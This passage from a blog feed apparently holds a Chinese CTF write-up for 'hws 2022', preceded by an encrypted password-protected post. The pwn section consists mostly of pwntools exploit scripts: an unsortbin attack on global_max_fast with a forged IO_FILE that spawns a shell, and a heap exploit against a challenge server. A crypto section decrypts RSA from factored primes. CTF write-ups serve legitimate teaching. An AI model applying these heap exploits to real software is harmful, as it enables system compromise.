e0612531485acd8005b51a3a623999971911b6e3aa68504744d27c3c50c63f592a0b8f19f2d15e075d122ddd42f499607cfc51e6b17e8dbd66b4a7fd70c9c22d6586f6556b9b5d7e1fed4d7311caf0e437a58da0d9d05c3b13daeda32c40e2625282cda3ae13979ac5ab896e422ccd6196389dd7147729fef592aa3b0f81d391fb51a4d2abff6b6b4e7b433288d6571eebcee727c91370fed6c9b6329ef16aee0e83034d9059bb38861dacae9cc85e668b8d392ab9eb5e6d70b4768c5f04bbe3497e657d79ea2fa7dda70ea43fdee57b3e917d1d2b62ee6e1d719f73dc0b3b97f0d3c4a03aee1e929cf6168b729a6d8449e52a551f1c8d3b597d36d8f68bc69888e6c46b977e8cf0e7e37141ebf97ee53f367207909ce5acb3566b53385dc42af6911efac0997c22b0ccad243c301f639cbf1fcd3cbc6f7282a6cf3ec409acd766c8db46e579a106aaf98ad443c2ea0144bc98ab5b761b4306d2b511516844d77e64baeb918f5cf14e52dbf693e5bc7882d89f258b25a4d0321f0f488d632a7fe4802c16d3e94c3be5774ccd35f98d2f9019211ff64340c8764fb68f0ab378eeacd092d5e3cb309760a53bdb44459b565f9931c5f19ca4ba41b8e06c0f1adfb13928187b2aa6986227c5caf43b2714e6d7ed092ef7e5eb78e1e915b3b3b52cb417e0463a73117d3ac62d87e3e36095822a1902a3775b598a9841654f10842f60c0fead3b751d2a3d54c3a3ee9e9575a7fa843d1fffde46e50b24c9daa5c6a2849fb867d0963eae3d3663602e95818d2362dddb26cfd8d7ae1a6bd265c79c5b7cb72a0b38eeb4e03b50b6dca16e6dc9d6ab18787fb0d9ae7ef64c1b100f4d1f63031a7596deb92cc720dadf3f6f77dfe6a0ca610ea97835252425e2c2005b9cba9095377f527bdb08e25a51b15b4344d402cf0066c1bb5b77d1eb7207def926d7f193042c0b219dc1f884efd479e5b6b524cfc758feb6426a97641a2c11333b114c4b76725de8d323fbc4748a9814c539a0a1e61e1be6d12e748a5fc3d06bde5d9f93c56a187bdcb70eddcdb93c1e7e8b55fa7cfd9908c7f4654216d66d83cd6f81ab2bf23f4d52beeb144d1d90147898c7909587ffb45c836f60d6cd2df86b06b56105546f7e9f29e2ac335df9b27797b48ccf1576c871e1e5320bd57c698e3dbbda5965e4a5489b5eae25c1409206e7f4e775c24adb45a5c816aa2534392ffbaa807a7d03e8d5012b719d424b95a93766403d4876cd44346847643972c0ade13efd4f843adde51a6e36f8ff0b6938e47bedffbadd03b7e9c87744a3683ad09a7248c72b8d4fa2e29b976c238f0350cbf2d3ad9f09b8585f7265cde4d35afccd228bbc8b4b088ac07e76c0405e2ff0a52801492fd78e877fb26f69e4b4f781803989bbe1150028fb46cb498c00af79790bc8841862211ff95945702dc3002923fd60bf0ef62a7ab1750892286a2b51648663e39981bce7775b7eca469f40fe18e6d2a8c455b8245b3703f9cfe85fbc187c21b47ca0625954616abd3a01c45f49141a5b8c24e2345f47a9f721f6f5a7e98160a1988dd80a320bd962c1a73c5c59034596cf9eb750e3ff17f7d54b654ea2adea858fa49c6615de4532da44e960a4933ae5046761975a746ddeea35b93164ea4be0679c9ef16d317405d4ad223a2c2be9219a5dddbc6ced27e579ec6687454f362a595e854444626a9fb9a038cfe2462934fe62101728f0c49207850afa5005105db528e0400b779cad45a0aae3cf89a0f5377514cba5d7c10f48dc1e5727a8dbea64a48bbc98c4190e85a7493c032b66c79aee708f05efe5a7bb7ae7f01af4f166e94febe88504b263951bce098edaafa7641f912e1cd6c938f855385acee66b3044a02f14d15dbee9efce7f3b70eac5def3fc0a25911028fe9fe18a15e043e766084e2e66f735f2061ae49fc306240e490c8eca235ee6c27624ac4c325a5dfa75c957bdce8cd43d2f2b5f6d086d67e8fc51ee111a4599d637549a005b47be41674a2027e83fa7428165715c1de2d1ecf8dd119ec616622d13365fbc467f0fe4bb0ecb0d81cc766685f1120ad3bc2af73110c7a21d9903bd71c0bec5a1f78e680f7c55ac3d07bd6c5215c12ad670b58aac7d895fc9ba0aca39cd0779a353b405cc67c9124d6250cc59b8176a07d6724fcbe548ab5a0848208d34b63ef76f2f782af14436add7cd72cf4b842ef077309b5a1f7c65727631de7f20271fcd1d1a065f314b6c4281dc2c679472c127b11dbe44b628e97c54a5db9d2944ff8125418aff53b29041eac46bb02ed2be6965f50ccaeb04e42c8da41b9d11c312955a04b46daf375961bb7ca1d181fba51d074c0186a3a9e02d07ffc93ba6c275a0b5c20fd1ff291a92883202092a0e684974453e9cb937a1c6cc161491e811687d9587a503fd69343ed091fa20e19b6e10d19f9d8d1d43f71a59724c9fb7428c9ca39eef6c3ad305ba33a9d88891a06df3b3e4f97dd568f7ba2ce42427341f568a8b11953012b852b510ed1142733ecb4969d6a9a61a674edec1da27b07fd32858dbda3d72dd19380ec55b36057bfaff3e69bce298759467965e337128a7a44ebf9630fe9ab61667b52f1463eb4574042ab6f70210f10d67e3fdfcc3dfd556b813547080bcec68059b1066e37e47272ea6198fd939a87e15d0f8a2f2784b6252528cb48c0e6063fb503d90a226529798faa5e0a4c241e9d0266ae7295d3292e21e178d907f1073038d64ef1efdbbf7cd5bdd01052f5334605fad25360e053b8b16bb7425c195b7223c9fb5aea44b8efac17024e8261c66b8851dae55fc40fe8791eb741d78fa650dffab3e70bce3790aa454bdf24d43adcd61ebc6ea590f626186d02063e6ed422599b84e2c988ad2203cac7002e8872ff4080fe81df9d0b25b63757ad68250ea8c962a088cec9f65f064484e17d60c4759735f663e8ef00be88ba095c2f1d3149750bf3787f32b595aad46ccbff9c888a05b3a8af0bdbf273aba633e94f441ca18f8692a018ff3d0bd97bffb14ef12ede57eaad54d4b9485a14ff3e8e8b0d312751fc206ca1128873a564dcdbc7727223bdfa5fbd98e929d26965aeb955ce4b603f3d6020d4ae6da8c7efaeff4414d9378879a4d2fe014251e4e757a4534ae753537ed01bc5fa2ec063c1f450e5264799dbfaafd078b0e9c40870ff021ef8c8ede7a3d0c6eb81e4228659be4bc39b4aeec9dc2cfa06dfc5262e735f8e9eb3aee3ecc1fca461291e07249a5fa9e66bf2ce7f93d1c8d5f56483bc85adf88c866cf1a60dd6f9c0026b44c8c228de7bc4e25ffd7a210257b0ac6e8cfaba87147f84abae9a8c575c01e715db3626cd799724f3e8b80d9287f325fa7c7a3b965630670617fa6a0dc2968ca15a7f69096b9d9f5c727923e629b344d4c66352b860f4d0ce9a8a4a3ebbdabd4ff00178fcb29d6e9cd7d7f01a43455866efb3545f47f9d286268eebed5ac6c8db81047fec4ea9fd3e423a55a0dffd571478db99b8ba208d49b06216c1cfce161d0b1badfd5dcb270be62bf0cdf310da0a870ef1a6f90c0480c9cced73adc8af9d2740213e7a759a8acb5c9748220343af17c04190edd738c3d7b790cfc4e39e3a39dc66d4570c92408700eedef6859f404f1071d93d5a1885bc8210a235fd32df38c6827764b798992eba4926fa53488f97084b4ef1e3ed995d76fb918dad2b6858d8878e8d8bc1defea820efca09326ccc7e00208b552c7cf863c9100f10b8da8da4b656feca7fa2ad53ab8af77a6fe8a23251cbae7b23380fe6e2285de990d64706fc1b8daf4e781f81c0284462526df548e3d8878356586079cdfb8ec486b7d64488563e77ef8993a5afd3ba4ad2a9ccd4b4f43ec51367c99f6c3e45e7aa2aff9ba3a4b85a92793ccf1c0db1fc866e58c50cc9dcf525d17f6edf4a3eed20aeb2d676d8920f091381371e15eb015438798a707ef0bfee043a59028ce37eb9f5571a79cdab48d7d430da2a634a91aef44349d7bcfdc2ec03a253ba7d2a11c9c2017f04f012b868f19103aee98f5f1103355c22f236ccd7abe179bb36486e5178a265ac83792501a681007009c0a5e1844b06ccca1d81e71e5f097d4649c26e8f9056fd6b85e418e2c151f9a2a53ca9916aeca1282056166297153e8ed9e6cb42c4555cc2a503bedaad71c534a6fe3246ff3aaccf1e86f2644481cba6ef2b7fcb7c74032797fa8e86c18bf0128573c5ef497d647a0fba4dc4858f18f2f3a6d4119c08e9aab303b492aa39e0f8147ca204ce0c452d5bc0ee1bb7e4ecc486949e847f4928d370ddbb4e8a5bcc2700555f7d06b24e1b0f42163c26b7b8ef78f546017431619c6cefc93fdc5a3ec24a1321cbbdaef7cf3e95902c626bc3637c65c3c0371c517b95bb7503fe81796d7aed7429ee79b6f121b07b2fbe1e49e18f178b9f170869e00227189c9e7974c122212bf478186085368a1d4b384b9a9a28230f65d9e9f17db49eb4a3ec4dbe22fc0021a99fdd4aecf660283297131a244597a5668f99eaba41eeed97980b1c0bc761053858b29d3288af76ce29f249ea0dc8974c18b273a322c633a8c40fd6292e8c17673e46cec8807f132331aefb4fb5dd793eeac81e00a53fbe25444d43798f55ea7d7b500f35f6bfd5d31cc502b10d21a8a8c7137bd0a4cdd260aa1f6600a279749cdf312b23bac0275d15de4d11c4d392ea5cd28b736926f7326bd8937f484fa17ea154330e33d6623053aee9e8afaa4ecf913b08f14d8968f4b5f5d2478e7d8d6ce5312808c311b153d1ab483a01ce801af64b481412ba0e6f9c31f9a0783934ef39309dcf2da6669e64ad36beb329e924c472d850c62ed838503cb88628e6c746882dcdf6a921a9e03cbba6b5ea06069a92e6c36f205fe4ec31968a01096905d7e543beac67e05cdd42aaf66bbaacdec7cda6372f0da079faf417227536fe4d7625898fa4d7c053a160366385cd5a5758a3eedfdc81537c3997c5c932ea65b433caa44a62abe7ac392db984d7b963f693c596e9781d19fd7240be0770fb0e9a9d3b61d1806059b350020d92eaf77c42d5e70ee0018e3287e93376dfa658d391257f7e89dccc6df0d01fdbe992a9239932e01fe8f8571465fd186f49abd7eebb6efeb7b19262b1c1348f34b87db1748bf1cbd772783fe42c36412627253c9910e06e191c98d483f66f65115365c208d2d25601bad0b86f4eb6fff17b31e3cf0724322ac83f64c6f3c0994230cf5768e13e7e84743b458eccf70bf7742bcad56a20e773f25f1c1da5be4a0ff4638e85b6d8a0d3e84702d059c2174c0aa5574598a85edeeef32896b03ac43d659dd23717bdcddfa3b100fe2abf0c20879a4700f7577c605ac58f2a35c2effcd2ec42ecd1703fe68b07285981c5ba62555ebad53822cf15073c13be3a51224f17361cae4b435d00e37a43feb37799812f1582012ee8eb229fe55a0b00f212714970a46027ae1a2cab19f2cccf0a2e496f0880b373d1e77e854415077ea25029aa26f16a61c4e262ff13cc7ce81bb034dd3c17331e14af55f59c94c32d96ee09a9c864649ebf3306a9a2bd1381a947ff408d8d0d0db5ad5d65462efe62d7aa0fbc6484ab60b3a4c49f0bdf69001405d27a4dc128c6fdd9eaaf04b701b05414e894e69a6911bc1d483404334b834da968d10479ba421e51c0c6158b579b7f8f775dd7a1b4e8b4b7fb26e56ed7104af3c2cb2379dd5b27625c35e78dfc0e745e9b43058caf6e0eb2ae0dc542f341dc86f58f99f47fbfeca8e25894101aaeeddbdcaff53da3b6a269f56f20b78b7530c6f148e8d6e00f326af3810b1a083569ce7447b96ce5b841e51849a0178fd035c4385b797c3b82eaf7713b6d4357d847d8cd091532f6f3092ff07c934ebf67b5161168116595213ae46b100ce4cddaa63f7822521c7e27d02e37d6cbc3b8ee84786023aae83e19dbdfdb17379b22aeb29e79b42e1477aa10c6122129acf4c9651b55c5d7343250137db2b200cd1a75436800aab84436d578e1aeb6ac7cfe51cea46a8bf8667eb3b3abd5f001a543258109ee6a8b21f38d254ef763e2e28e38121ba727c919ba537a922f46013c894bad25a7d6499aebebb4b4c612af67278ff3df1176f8e4cce85aff9086085db4bd92a2955d7f46767430ba4f202b130d536bbdab2f825bb08c2a59a2be01d53eada14990e1452defa2b7ff0f58e4c8e7593ae2123533aa9d6cc384dafcec3b4be0a53e0da3755be52cb53d7cbf416c76a229ea4635f2461d5ecd47653140e628a7f12d45d3d82c9137fe7a0d6e22131f7fb560eb36f2f497b3900ed5f519f4dc53d4edd70ea4efc329e69b39c7e148094a26f2bee91f3c079e7cade70914a6408a6fa4cc5ff221d83a4988e2fbc789349338c4a3186262eef7e1637633edd968cc984645b7b1c71f8e090389cfbf0fcd5489122ee102c6d4260ac095cf14acbb28fed1f4ab85fbf12b07c15b59d437e0caec8bede9dd000f90c77778c119d7d122fe87f247392f90b1cfbc12dbaacb9fc55d8d4ed81e437c41a59284b48b1a90273083cf852f5c5a1dbf2c6294e26001e5a5e0e406ed684c1aae6bc798d8d9dac73da4d212bebb2b2cd6d12d66a692591a0f9e1588dca068e66469b260eb7f4f4b180808f066d4298f0b7fb4eb9e1cc8514e7becac4a27968efd5e011465195f4be61900af7622e25915d7e830a34f4e5702fd5bc4bc3ac23de9d895df2cd8d0eec30dc8e37fee8c4be808ff8cbbf3acc425f4207815b5394fed142438f1ad72b06ab37da509fdd144a22adb48a918e9c6238f8d00d9719209c0ad26c3f3963f358400d076f29d866ad0434c92f606f0f3ac21dde913874ec94187a67df2e7ba425196a3bc40d8ddc63f3c59f9fd0a9453b54db4fb2b41b706a15dd6718d3d7932a501a8ee9c2b8f962f94467cd1928effcc1fe894a1d1e4392d376b812c1de6c331de6d8c1485aed78bf86d83314fa8e23c90da0b927c36cdafc82c276f07efe83a68036c43d9e57c17046df4b2c910dff55101cc07c6c1f88d8c299468885c274b82fd24eec1c061bc6f6abeeab8e2bdd4a2bf90d0f8ebc12481b86ee2886f3be84ac261f262b237815c82880782933aafdbd3cc3c0322fab5b616c8e5137b291f9b873d96134ef44e5c540c927528e537572e57836fee050caaf902623fb147e6c967e03d5199766ca3691f9631da14a448bed01cbcce0f96f258fad58083af265debdebbfc381da42a5ae33c12cd175f499f052b27ac6568eb32f8fdd47061dbe63ba80d103aafc6d689b4862ef279b8a80fe487e310a13275fe859aa2b8800e47b45f6baf2600f46a5ee50f2fdb9795f0edcf4bda06cdea23caa161ad652c473f646c40f7b168891fc8d1fca137b3a2f6a35a3e0b2793ee1376c2f03a070abbbb90f15c0420a4fc90f2e35f4337e5c16174d235c3aad43a1d36d578e8b9c8a066e96dcf0b5b95dac9e405bd58a813ed5df64dddd09690d30040745059a25e4db32cc98ef21ab944436bfa0af9a78d830a7f85ef0bd1bda744c093fdce5a1f4d2875bcd52ddf85bcb1a2d4f2bba7d17247a1e9c804e1424126930b55af0a2188436557a0b8312d1ebc22e2604742e4d2b1bf220cc15bc14c9b345c43571fc778360e3b2e316d13f4924b62cfff15ef2513fea84ca0ca9ee6a7f260f39b891a8ddfeb607974ec7c97ae506734b72391dc00a7dd13ba4ecd862baafe02b2d58d046589c3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>求职</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hws_2022_wp</title>
    <link href="/2022/01/26/hws%202022%20wp/"/>
    <url>/2022/01/26/hws%202022%20wp/</url>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>一道原题<a href="https://www.anquanke.com/post/id/258512%EF%BC%8CUnsortbin">https://www.anquanke.com/post/id/258512，Unsortbin</a> Attack改Global_max_fast，然后劫持_IO_list_all，伪造一个io_file结构体，利用 <code>_IO_str_finish</code>来拿shell</p><blockquote><p>exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;1.13.162.249&#x27;</span>, <span class="hljs-number">10001</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(binary)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *$rebase(0xabd)&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size?\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x1430</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;size?\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x5000</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;)\n&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>global_max_fast = libc_base + <span class="hljs-number">0x3ed940</span><br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_str_jumps = libc_base + <span class="hljs-number">0x3e8360</span><br>binsh = <span class="hljs-number">0x1b3e1a</span> + libc_base<br><span class="hljs-comment"># pause()</span><br>payload = p64(libc_base+ <span class="hljs-number">0x70</span> + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]) + p64(global_max_fast-<span class="hljs-number">0x10</span>)<br>p.sendafter(<span class="hljs-string">&#x27;name!\n&#x27;</span>, payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;)\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>binshsdd = <span class="hljs-number">0x1b40fa</span> + libc_base<br>IO_str_jumps = libc_base + <span class="hljs-number">0x7f5020add360</span> - <span class="hljs-number">0x7f50206f5000</span><br>fake_IO_FILE  = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(binshsdd+<span class="hljs-number">1</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64((binshsdd-<span class="hljs-number">100</span>)/<span class="hljs-number">2</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE =  fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])<br>p.send(fake_IO_FILE)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="peach"><a href="#peach" class="headerlink" title="peach"></a>peach</h3><p>这道题应该是祥云杯lemon改编来的，参考当时的官方解法</p><ol><li><p>在堆的分配、释放中检测到错误的时候，会调用malloc_printerr处理错误</p></li><li><p>在glibc-2.26 以及之前的版本中， malloc_printerr会根据check_action的值执行不同的分支，在action &amp; 1为true时，会打印程序名，存在leak</p></li></ol><p><img src="https://s2.loli.net/2022/01/26/J5qbSgZvd4ADkXs.png"></p><blockquote><p>exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./peachw&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;./libc/libc-2.26.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;1.13.162.249&#x27;</span>, <span class="hljs-number">10003</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc/libc-2.26.so&#x27;</span>)<br>elf = ELF(binary)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, name, size, content</span>):</span><br>p.send(<span class="hljs-string">&#x27;\x01&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;: \n&#x27;</span>, name)<br>p.sendlineafter(<span class="hljs-string">&#x27;peach:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>rv = p.recvline()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;descripe&quot;</span> <span class="hljs-keyword">in</span> rv:<br>p.send(content)<br>p.recvuntil(<span class="hljs-string">&quot;Success!\n&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;\x02&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27; ?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index, num</span>):</span><br>p.sendafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;\x03&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27; ? &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;number?\n&#x27;</span>, num)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, size, content</span>):</span><br>p.sendafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;\x04&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27; ? &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;peach : &#x27;</span>, p16(size))<br>p.sendafter(<span class="hljs-string">&#x27;peach \n&#x27;</span>, content)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br>p.sendafter(<span class="hljs-string">&#x27;peach?\n&#x27;</span>, <span class="hljs-string">&#x27;yes\x00&#x27;</span>.ljust(<span class="hljs-number">0x1d</span>, <span class="hljs-string">&#x27;a&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;peach is &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>], <span class="hljs-number">10</span>) - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;stack_addr -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(stack_addr)))<br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;\xa0&#x27;</span>, <span class="hljs-number">0x300</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>))<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>edit(-<span class="hljs-number">36</span>, <span class="hljs-number">0x220</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x198</span> + p16(stack_addr))<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">2</span>)<br>msg = p.recv()<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> msg:<br><span class="hljs-built_in">print</span>(msg)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p><a href="!http://www.factordb.com/index.php">在线分解</a>n得到p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033</span><br>q=<span class="hljs-number">133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e=<span class="hljs-number">2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877</span><br>p=<span class="hljs-number">98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033</span><br>q=<span class="hljs-number">133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513</span><br>c = <span class="hljs-number">1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524</span><br>n = p*q<br>phin = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phin)<br><span class="hljs-built_in">print</span> long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n))<br></code></pre></td></tr></table></figure><p><img 